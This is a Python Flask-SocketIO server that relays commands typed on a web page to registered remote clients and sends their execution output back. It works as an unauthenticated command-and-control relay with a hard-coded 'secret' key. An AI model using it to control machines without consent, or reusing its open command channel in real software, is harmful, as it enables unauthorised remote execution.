from flask import Flask, render_template, request
from flask_socketio import SocketIO, send, emit

app = Flask(__name__, template_folder='templates/')
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)

connected_users = {}


@app.route('/', methods=['GET', 'POST'])
def command():
    return render_template('index.html')


@socketio.on('connect')
def test_connect():
    # emit('Message from server : ', {'data': 'Connected'})
    print('Client got connected !')


@socketio.on('first_handshake')
def handle_first_handshake(payload):

    connected_users[payload['client_ID']] = payload['client_Session_ID']
    print(f'A client got connected ! \nPayload Data: \n{str(payload)}')
    socketio.emit('update_connections_list', payload)


@socketio.on('command_from_web', namespace='/command')
def command_to_client(payload):

    recipient_session_ID = connected_users[payload['client_ID']]
    command = payload['command']

    print(payload)
    print(recipient_session_ID)
    print(command)

    emit('server_commands', command, room=recipient_session_ID)


@socketio.on('output_from_client')
def handle_output_from_client(message):
    print(f'The execution in Client was : {message}')
    socketio.emit('output_from_client_to_web', message)


debug = False

if __name__ == "__main__":
    socketio.run(app, debug=debug, port=5000)
    emit('send_command_to_client', {'foo': 'bar'}, broadcast=True)
